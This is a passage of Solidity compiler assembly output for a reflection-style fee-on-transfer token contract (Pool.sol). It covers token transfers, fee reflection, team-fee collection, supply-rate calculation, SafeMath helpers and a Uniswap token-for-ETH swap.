\"contracts/Pool/Pool.sol\":10690:10701  tokenAmount */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":10715:10716  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":10730:10734  path */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":10756:10760  this */\n      address\n        /* \"contracts/Pool/Pool.sol\":10775:10790  block.timestamp */\n      timestamp\n        /* \"contracts/Pool/Pool.sol\":10610:10800  uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(... */\n      mload(0x40)\n      dup7\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_355\n      swap6\n      swap5\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_356\n      jump\t// in\n    tag_355:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_357\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_357:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_359\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_359:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Pool/Pool.sol\":10400:10807  {... */\n      pop\n        /* \"contracts/Pool/Pool.sol\":5276:5281  false */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":5267:5273  inSwap */\n      0x14\n      dup1\n        /* \"contracts/Pool/Pool.sol\":5267:5281  inSwap = false */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":10333:10807  function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {... */\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":12077:12558  function _transferStandard(address sender, address recipient, uint256 tAmount) private {... */\n    tag_323:\n        /* \"contracts/Pool/Pool.sol\":12175:12190  uint256 rAmount */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":12192:12215  uint256 rTransferAmount */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":12217:12229  uint256 rFee */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":12231:12254  uint256 tTransferAmount */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":12256:12268  uint256 tFee */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":12270:12283  uint256 tTeam */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":12287:12306  _getValues(tAmount) */\n      tag_361\n        /* \"contracts/Pool/Pool.sol\":12298:12305  tAmount */\n      dup8\n        /* \"contracts/Pool/Pool.sol\":12287:12297  _getValues */\n      tag_362\n        /* \"contracts/Pool/Pool.sol\":12287:12306  _getValues(tAmount) */\n      jump\t// in\n    tag_361:\n        /* \"contracts/Pool/Pool.sol\":12174:12306  (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getValues(tAmount) */\n      swap6\n      pop\n      swap6\n      pop\n      swap6\n      pop\n      swap6\n      pop\n      swap6\n      pop\n      swap6\n      pop\n        /* \"contracts/Pool/Pool.sol\":12334:12362  _rOwned[sender].sub(rAmount) */\n      tag_363\n        /* \"contracts/Pool/Pool.sol\":12354:12361  rAmount */\n      dup7\n        /* \"contracts/Pool/Pool.sol\":12334:12341  _rOwned */\n      0x02\n        /* \"contracts/Pool/Pool.sol\":12334:12349  _rOwned[sender] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":12342:12348  sender */\n      dup13\n        /* \"contracts/Pool/Pool.sol\":12334:12349  _rOwned[sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"contracts/Pool/Pool.sol\":12334:12353  _rOwned[sender].sub */\n      tag_364\n      swap1\n        /* \"contracts/Pool/Pool.sol\":12334:12362  _rOwned[sender].sub(rAmount) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_363:\n        /* \"contracts/Pool/Pool.sol\":12316:12323  _rOwned */\n      0x02\n        /* \"contracts/Pool/Pool.sol\":12316:12331  _rOwned[sender] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":12324:12330  sender */\n      dup12\n        /* \"contracts/Pool/Pool.sol\":12316:12331  _rOwned[sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"contracts/Pool/Pool.sol\":12316:12362  _rOwned[sender] = _rOwned[sender].sub(rAmount) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":12393:12432  _rOwned[recipient].add(rTransferAmount) */\n      tag_365\n        /* \"contracts/Pool/Pool.sol\":12416:12431  rTransferAmount */\n      dup6\n        /* \"contracts/Pool/Pool.sol\":12393:12400  _rOwned */\n      0x02\n        /* \"contracts/Pool/Pool.sol\":12393:12411  _rOwned[recipient] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":12401:12410  recipient */\n      dup12\n        /* \"contracts/Pool/Pool.sol\":12393:12411  _rOwned[recipient] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"contracts/Pool/Pool.sol\":12393:12415  _rOwned[recipient].add */\n      tag_366\n      swap1\n        /* \"contracts/Pool/Pool.sol\":12393:12432  _rOwned[recipient].add(rTransferAmount) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_365:\n        /* \"contracts/Pool/Pool.sol\":12372:12379  _rOwned */\n      0x02\n        /* \"contracts/Pool/Pool.sol\":12372:12390  _rOwned[recipient] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":12380:12389  recipient */\n      dup11\n        /* \"contracts/Pool/Pool.sol\":12372:12390  _rOwned[recipient] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"contracts/Pool/Pool.sol\":12372:12432  _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":12443:12459  _takeTeam(tTeam) */\n      tag_367\n        /* \"contracts/Pool/Pool.sol\":12453:12458  tTeam */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":12443:12452  _takeTeam */\n      tag_368\n        /* \"contracts/Pool/Pool.sol\":12443:12459  _takeTeam(tTeam) */\n      jump\t// in\n    tag_367:\n        /* \"contracts/Pool/Pool.sol\":12469:12492  _reflectFee(rFee, tFee) */\n      tag_369\n        /* \"contracts/Pool/Pool.sol\":12481:12485  rFee */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":12487:12491  tFee */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":12469:12480  _reflectFee */\n      tag_370\n        /* \"contracts/Pool/Pool.sol\":12469:12492  _reflectFee(rFee, tFee) */\n      jump\t// in\n    tag_369:\n        /* \"contracts/Pool/Pool.sol\":12524:12533  recipient */\n      dup8\n        /* \"contracts/Pool/Pool.sol\":12507:12551  Transfer(sender, recipient, tTransferAmount) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":12516:12522  sender */\n      dup10\n        /* \"contracts/Pool/Pool.sol\":12507:12551  Transfer(sender, recipient, tTransferAmount) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n        /* \"contracts/Pool/Pool.sol\":12535:12550  tTransferAmount */\n      dup6\n        /* \"contracts/Pool/Pool.sol\":12507:12551  Transfer(sender, recipient, tTransferAmount) */\n      mload(0x40)\n      tag_371\n      swap2\n      swap1\n      tag_53\n      jump\t// in\n    tag_371:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"contracts/Pool/Pool.sol\":12164:12558  {... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Pool/Pool.sol\":12077:12558  function _transferStandard(address sender, address recipient, uint256 tAmount) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":2542:2672  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_326:\n        /* \"contracts/Pool/Pool.sol\":2600:2607  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":2626:2665  div(a, b, \"SafeMath: division by zero\") */\n      tag_373\n        /* \"contracts/Pool/Pool.sol\":2630:2631  a */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":2633:2634  b */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":2626:2665  div(a, b, \"SafeMath: division by zero\") */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1a\n      dup2\n      mstore\n      0x20\n      add\n      0x536166654d6174683a206469766973696f6e206279207a65726f000000000000\n      dup2\n      mstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":2626:2629  div */\n      tag_374\n        /* \"contracts/Pool/Pool.sol\":2626:2665  div(a, b, \"SafeMath: division by zero\") */\n      jump\t// in\n    tag_373:\n        /* \"contracts/Pool/Pool.sol\":2619:2665  return div(a, b, \"SafeMath: division by zero\") */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":2542:2672  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":14195:14355  function _getRate() private view returns(uint256) {... */\n    tag_337:\n        /* \"contracts/Pool/Pool.sol\":14236:14243  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":14256:14271  uint256 rSupply */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":14273:14288  uint256 tSupply */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":14292:14311  _getCurrentSupply() */\n      tag_376\n        /* \"contracts/Pool/Pool.sol\":14292:14309  _getCurrentSupply */\n      tag_377\n        /* \"contracts/Pool/Pool.sol\":14292:14311  _getCurrentSupply() */\n      jump\t// in\n    tag_376:\n        /* \"contracts/Pool/Pool.sol\":14255:14311  (uint256 rSupply, uint256 tSupply) = _getCurrentSupply() */\n      swap2\n      pop\n      swap2\n      pop\n        /* \"contracts/Pool/Pool.sol\":14328:14348  rSupply.div(tSupply) */\n      tag_378\n        /* \"contracts/Pool/Pool.sol\":14340:14347  tSupply */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":14328:14335  rSupply */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":14328:14339  rSupply.div */\n      tag_326\n      swap1\n        /* \"contracts/Pool/Pool.sol\":14328:14348  rSupply.div(tSupply) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_378:\n        /* \"contracts/Pool/Pool.sol\":14321:14348  return rSupply.div(tSupply) */\n      swap3\n      pop\n      pop\n      pop\n        /* \"contracts/Pool/Pool.sol\":14195:14355  function _getRate() private view returns(uint256) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":12967:13431  function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {... */\n    tag_362:\n        /* \"contracts/Pool/Pool.sol\":13026:13033  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":13035:13042  uint256 */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":13044:13051  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":13053:13060  uint256 */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":13062:13069  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":13071:13078  uint256 */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":13091:13114  uint256 tTransferAmount */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":13116:13128  uint256 tFee */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":13130:13143  uint256 tTeam */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":13147:13187  _getTValues(tAmount, _redisFee, _taxFee) */\n      tag_380\n        /* \"contracts/Pool/Pool.sol\":13159:13166  tAmount */\n      dup11\n        /* \"contracts/Pool/Pool.sol\":13168:13177  _redisFee */\n      sload(0x0c)\n        /* \"contracts/Pool/Pool.sol\":13179:13186  _taxFee */\n      sload(0x0d)\n        /* \"contracts/Pool/Pool.sol\":13147:13158  _getTValues */\n      tag_381\n        /* \"contracts/Pool/Pool.sol\":13147:13187  _getTValues(tAmount, _redisFee, _taxFee) */\n      jump\t// in\n    tag_380:\n        /* \"contracts/Pool/Pool.sol\":13090:13187  (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _redisFee, _taxFee) */\n      swap3\n      pop\n      swap3\n      pop\n      swap3\n      pop\n        /* \"contracts/Pool/Pool.sol\":13197:13216  uint256 currentRate */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":13220:13230  _getRate() */\n      tag_382\n        /* \"contracts/Pool/Pool.sol\":13220:13228  _getRate */\n      tag_337\n        /* \"contracts/Pool/Pool.sol\":13220:13230  _getRate() */\n      jump\t// in\n    tag_382:\n        /* \"contracts/Pool/Pool.sol\":13197:13230  uint256 currentRate =  _getRate() */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":13241:13256  uint256 rAmount */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":13258:13281  uint256 rTransferAmount */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":13283:13295  uint256 rFee */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":13299:13345  _getRValues(tAmount, tFee, tTeam, currentRate) */\n      tag_383\n        /* \"contracts/Pool/Pool.sol\":13311:13318  tAmount */\n      dup15\n        /* \"contracts/Pool/Pool.sol\":13320:13324  tFee */\n      dup8\n        /* \"contracts/Pool/Pool.sol\":13326:13331  tTeam */\n      dup8\n        /* \"contracts/Pool/Pool.sol\":13333:13344  currentRate */\n      dup8\n        /* \"contracts/Pool/Pool.sol\":13299:13310  _getRValues */\n      tag_384\n        /* \"contracts/Pool/Pool.sol\":13299:13345  _getRValues(tAmount, tFee, tTeam, currentRate) */\n      jump\t// in\n    tag_383:\n        /* \"contracts/Pool/Pool.sol\":13240:13345  (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate) */\n      swap3\n      pop\n      swap3\n      pop\n      swap3\n      pop\n        /* \"contracts/Pool/Pool.sol\":13363:13370  rAmount */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":13372:13387  rTransferAmount */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":13389:13393  rFee */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":13395:13410  tTransferAmount */\n      dup10\n        /* \"contracts/Pool/Pool.sol\":13412:13416  tFee */\n      dup10\n        /* \"contracts/Pool/Pool.sol\":13418:13423  tTeam */\n      dup10\n        /* \"contracts/Pool/Pool.sol\":13355:13424  return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam) */\n      swap13\n      pop\n      swap13\n      pop\n      swap13\n      pop\n      swap13\n      pop\n      swap13\n      pop\n      swap13\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Pool/Pool.sol\":12967:13431  function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {... */\n      swap2\n      swap4\n      swap6\n      pop\n      swap2\n      swap4\n      swap6\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":1965:2099  function sub(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_364:\n        /* \"contracts/Pool/Pool.sol\":2023:2030  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":2049:2092  sub(a, b, \"SafeMath: subtraction overflow\") */\n      tag_386\n        /* \"contracts/Pool/Pool.sol\":2053:2054  a */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":2056:2057  b */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":2049:2092  sub(a, b, \"SafeMath: subtraction overflow\") */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1e\n      dup2\n      mstore\n      0x20\n      add\n      0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000\n      dup2\n      mstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":2049:2052  sub */\n      tag_159\n        /* \"contracts/Pool/Pool.sol\":2049:2092  sub(a, b, \"SafeMath: subtraction overflow\") */\n      jump\t// in\n    tag_386:\n        /* \"contracts/Pool/Pool.sol\":2042:2092  return sub(a, b, \"SafeMath: subtraction overflow\") */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":1965:2099  function sub(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":1784:1959  function add(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_366:\n        /* \"contracts/Pool/Pool.sol\":1842:1849  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":1861:1870  uint256 c */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":1877:1878  b */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":1873:1874  a */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":1873:1878  a + b */\n      tag_388\n      swap2\n      swap1\n      tag_389\n      jump\t// in\n    tag_388:\n        /* \"contracts/Pool/Pool.sol\":1861:1878  uint256 c = a + b */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":1901:1902  a */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":1896:1897  c */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":1896:1902  c >= a */\n      lt\n      iszero\n        /* \"contracts/Pool/Pool.sol\":1888:1934  require(c >= a, \"SafeMath: addition overflow\") */\n      tag_390\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_391\n      swap1\n      tag_392\n      jump\t// in\n    tag_391:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_390:\n        /* \"contracts/Pool/Pool.sol\":1951:1952  c */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":1944:1952  return c */\n      swap2\n      pop\n      pop\n        /* \"contracts/Pool/Pool.sol\":1784:1959  function add(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":12564:12772  function _takeTeam(uint256 tTeam) private {... */\n    tag_368:\n        /* \"contracts/Pool/Pool.sol\":12616:12635  uint256 currentRate */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":12639:12649  _getRate() */\n      tag_394\n        /* \"contracts/Pool/Pool.sol\":12639:12647  _getRate */\n      tag_337\n        /* \"contracts/Pool/Pool.sol\":12639:12649  _getRate() */\n      jump\t// in\n    tag_394:\n        /* \"contracts/Pool/Pool.sol\":12616:12649  uint256 currentRate =  _getRate() */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":12659:12672  uint256 rTeam */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":12675:12697  tTeam.mul(currentRate) */\n      tag_395\n        /* \"contracts/Pool/Pool.sol\":12685:12696  currentRate */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":12675:12680  tTeam */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":12675:12684  tTeam.mul */\n      tag_396\n      swap1\n        /* \"contracts/Pool/Pool.sol\":12675:12697  tTeam.mul(currentRate) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_395:\n        /* \"contracts/Pool/Pool.sol\":12659:12697  uint256 rTeam = tTeam.mul(currentRate) */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":12732:12765  _rOwned[address(this)].add(rTeam) */\n      tag_397\n        /* \"contracts/Pool/Pool.sol\":12759:12764  rTeam */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":12732:12739  _rOwned */\n      0x02\n        /* \"contracts/Pool/Pool.sol\":12732:12754  _rOwned[address(this)] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":12748:12752  this */\n      address\n        /* \"contracts/Pool/Pool.sol\":12732:12754  _rOwned[address(this)] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"contracts/Pool/Pool.sol\":12732:12758  _rOwned[address(this)].add */\n      tag_366\n      swap1\n        /* \"contracts/Pool/Pool.sol\":12732:12765  _rOwned[address(this)].add(rTeam) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_397:\n        /* \"contracts/Pool/Pool.sol\":12707:12714  _rOwned */\n      0x02\n        /* \"contracts/Pool/Pool.sol\":12707:12729  _rOwned[address(this)] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":12723:12727  this */\n      address\n        /* \"contracts/Pool/Pool.sol\":12707:12729  _rOwned[address(this)] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"contracts/Pool/Pool.sol\":12707:12765  _rOwned[address(this)] = _rOwned[address(this)].add(rTeam) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":12606:12772  {... */\n      pop\n      pop\n        /* \"contracts/Pool/Pool.sol\":12564:12772  function _takeTeam(uint256 tTeam) private {... */\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":12778:12922  function _reflectFee(uint256 rFee, uint256 tFee) private {... */\n    tag_370:\n        /* \"contracts/Pool/Pool.sol\":12855:12872  _rTotal.sub(rFee) */\n      tag_399\n        /* \"contracts/Pool/Pool.sol\":12867:12871  rFee */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":12855:12862  _rTotal */\n      sload(0x06)\n        /* \"contracts/Pool/Pool.sol\":12855:12866  _rTotal.sub */\n      tag_364\n      swap1\n        /* \"contracts/Pool/Pool.sol\":12855:12872  _rTotal.sub(rFee) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_399:\n        /* \"contracts/Pool/Pool.sol\":12845:12852  _rTotal */\n      0x06\n        /* \"contracts/Pool/Pool.sol\":12845:12872  _rTotal = _rTotal.sub(rFee) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":12895:12915  _tFeeTotal.add(tFee) */\n      tag_400\n        /* \"contracts/Pool/Pool.sol\":12910:12914  tFee */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":12895:12905  _tFeeTotal */\n      sload(0x07)\n        /* \"contracts/Pool/Pool.sol\":12895:12909  _tFeeTotal.add */\n      tag_366\n      swap1\n        /* \"contracts/Pool/Pool.sol\":12895:12915  _tFeeTotal.add(tFee) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_400:\n        /* \"contracts/Pool/Pool.sol\":12882:12892  _tFeeTotal */\n      0x07\n        /* \"contracts/Pool/Pool.sol\":12882:12915  _tFeeTotal = _tFeeTotal.add(tFee) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":12778:12922  function _reflectFee(uint256 rFee, uint256 tFee) private {... */\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":2678:2863  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n    tag_374:\n        /* \"contracts/Pool/Pool.sol\":2764:2771  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":2795:2796  0 */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":2791:2792  b */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":2791:2796  b > 0 */\n      gt\n        /* \"contracts/Pool/Pool.sol\":2798:2810  errorMessage */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":2783:2811  require(b > 0, errorMessage) */\n      swap1\n      tag_402\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_403\n      swap2\n      swap1\n      tag_36\n      jump\t// in\n    tag_403:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_402:\n      pop\n        /* \"contracts/Pool/Pool.sol\":2821:2830  uint256 c */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":2837:2838  b */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":2833:2834  a */\n      dup6\n        /* \"contracts/Pool/Pool.sol\":2833:2838  a / b */\n      tag_404\n      swap2\n      swap1\n      tag_405\n      jump\t// in\n    tag_404:\n        /* \"contracts/Pool/Pool.sol\":2821:2838  uint256 c = a / b */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":2855:2856  c */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":2848:2856  return c */\n      swap2\n      pop\n      pop\n        /* \"contracts/Pool/Pool.sol\":2678:2863  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":14361:14618  function _getCurrentSupply() private view returns(uint256, uint256) {... */\n    tag_377:\n        /* \"contracts/Pool/Pool.sol\":14411:14418  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":14420:14427  uint256 */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":14439:14454  uint256 rSupply */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":14457:14464  _rTotal */\n      sload(0x06)\n        /* \"contracts/Pool/Pool.sol\":14439:14464  uint256 rSupply = _rTotal */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":14474:14489  uint256 tSupply */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":4138:4151  1*10**9*10**9 */\n      0x0de0b6b3a7640000\n        /* \"contracts/Pool/Pool.sol\":14474:14499  uint256 tSupply = _tTotal */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":14529:14549  _rTotal.div(_tTotal) */\n      tag_407\n        /* \"contracts/Pool/Pool.sol\":4138:4151  1*10**9*10**9 */\n      0x0de0b6b3a7640000\n        /* \"contracts/Pool/Pool.sol\":14529:14536  _rTotal */\n      sload(0x06)\n        /* \"contracts/Pool/Pool.sol\":14529:14540  _rTotal.div */\n      tag_326\n      swap1\n        /* \"contracts/Pool/Pool.sol\":14529:14549  _rTotal.div(_tTotal) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_407:\n        /* \"contracts/Pool/Pool.sol\":14519:14526  rSupply */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":14519:14549  rSupply < _rTotal.div(_tTotal) */\n      lt\n        /* \"contracts/Pool/Pool.sol\":14515:14576  if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal) */\n      iszero\n      tag_408\n      jumpi\n        /* \"contracts/Pool/Pool.sol\":14559:14566  _rTotal */\n      sload(0x06)\n        /* \"contracts/Pool/Pool.sol\":4138:4151  1*10**9*10**9 */\n      0x0de0b6b3a7640000\n        /* \"contracts/Pool/Pool.sol\":14551:14576  return (_rTotal, _tTotal) */\n      swap4\n      pop\n      swap4\n      pop\n      pop\n      pop\n      jump(tag_406)\n        /* \"contracts/Pool/Pool.sol\":14515:14576  if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal) */\n    tag_408:\n        /* \"contracts/Pool/Pool.sol\":14594:14601  rSupply */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":14603:14610  tSupply */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":14586:14611  return (rSupply, tSupply) */\n      swap4\n      pop\n      swap4\n      pop\n      pop\n      pop\n        /* \"contracts/Pool/Pool.sol\":14361:14618  function _getCurrentSupply() private view returns(uint256, uint256) {... */\n    tag_406:\n      swap1\n      swap2\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":13437:13783  function _getTValues(uint256 tAmount, uint256 taxFee, uint256 TeamFee) private pure returns (uint256, uint256, uint256) {... */\n    tag_381:\n        /* \"contracts/Pool/Pool.sol\":13530:13537  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":13539:13546  uint256 */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":13548:13555  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":13567:13579  uint256 tFee */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":13582:13610  tAmount.mul(taxFee).div(100) */\n      tag_410\n        /* \"contracts/Pool/Pool.sol\":13606:13609  100 */\n      0x64\n        /* 